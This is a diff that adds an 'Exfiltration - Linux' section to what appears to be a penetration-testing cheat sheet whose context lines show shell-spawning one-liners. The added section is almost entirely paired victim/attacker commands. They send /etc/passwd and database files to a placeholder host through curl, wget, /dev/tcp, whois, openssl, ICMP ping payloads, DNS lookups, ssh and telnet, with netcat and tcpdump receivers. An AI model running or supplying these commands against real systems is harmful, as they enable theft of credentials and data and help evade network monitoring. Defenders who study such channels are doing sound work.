@@ -7,6 +7,7 @@
 	* [Python](#python)
 	* [Perl](#perl)
 * [Extension Linux](#extension-linux)
+* [Exfiltration - Linux](#exfiltration-linux)
 * [IP address bypass](#ip-address-bypass)
 * [Useful Regex](#useful-regex)
 * [References](#references)
@@ -68,6 +69,103 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ### Perl
 ```perl
 perl -e 'exec "/bin/bash";'
+```
+## Exfiltration - Linux
+```bash
+VICTIM:
+cat /etc/passwd | curl -F "data=@-" http://xxx.xxx.xxx.xxx 
+
+ATTACKER:
+nc -lvp 80
+```
+```bash
+VICTIM:
+cat /etc/passwd | base64 > /dev/tcp/xxx.xxx.xxx.xxx/80
+
+ATTACKER:
+netcat -lvp 80 | base64 -d
+```
+```bash
+VICTIM:
+cat /etc/passwd | base 64 > /dev/tcp/xxx.xxx.xxx.xxx/443 
+
+ATTACKER:
+netcat -lvp 443 | base64 -d
+```
+```bash
+VICTIM:
+wget --post-file=/etc/passwd xxx.xxx.xxx.xxx 
+
+ATTACKER:
+nc -lvp 80
+```
+```bash
+VICTIM:
+curl -X POST -d @data.txt xxx.xxx.xxx.xxx
+
+ATTACKER:
+nc -lvp 80
+```
+```bash
+VICTIM:
+whois -h xxx.xxx.xxx.xxx -p 43 `cat /etc/passwd`
+
+ATTACKER:
+nc -lvp 43
+```
+```bash
+VICTIM:
+bash -c 'echo -e "POST / HTTP/0.9\n\n$(</etc/passwd)"' > /dev/tcp/xxx.xxx.xxx.xxx/1234
+
+ATTACKER:
+nc -lvp 1234
+```
+```bash
+VICTIM:
+openssl s_client -quiet -connect xxx.xxx.xxx.xxx:1234 < "/etc/passwd"
+
+ATTACKER:
+openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes ; openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port 1234 > /tmp/dump ; cat /tmp/dump
+```
+```bash
+VICTIM:
+cat /etc/passwd | xxd -p -c 15 | while read line; do ping -p $line -c 1 xxx.xxx.xxx.xxx; done
+
+ATTACKER:
+/usr/sbin/tcpdump 'icmp and src host 1.2.3.4' -w /tmp/icmp_file.pcap ; echo "0x$(tshark -n -q -r /tmp/icmp_file.pcap -T fields -e data.data | tr -d '\n' | tr -d ':')" | xxd -r -p
+```
+```bash
+VICTIM:
+cat /etc/passwd | xxd -p -c 8 | while read line; do host $line.7.7.7.7 xxx.xxx.xxx.xxx ; done
+
+ATTACKER:
+/usr/sbin/tcpdump -l -n port 53 | grep -oP "(?=\? ).*(?<=7.7.7.7)"
+```
+```bash
+VICTIM:
+tar zcf - --absolute-names /etc/passwd | ssh -p2233 user@xxx.xxx.xxx.xxx "cd /tmp/; tar zxpf -"
+
+```
+```bash
+VICTIM:
+python -m SimpleHTTPServer 7777
+
+ATTACKER:
+wget xxx.xxx.xxx.xxx:7777/database.sql
+```
+```bash
+VICTIM:
+php -S 0.0.0.0:7777
+
+ATTACKER:
+wget xxx.xxx.xxx.xxx:7777/database.sql
+```
+```bash
+VICTIM:
+telnet xxx.xxx.xxx.xxx 5555 < /etc/passwd
+
+ATTACKER:
+netcat -lp 5555
 ```
 
 ## IP address bypass
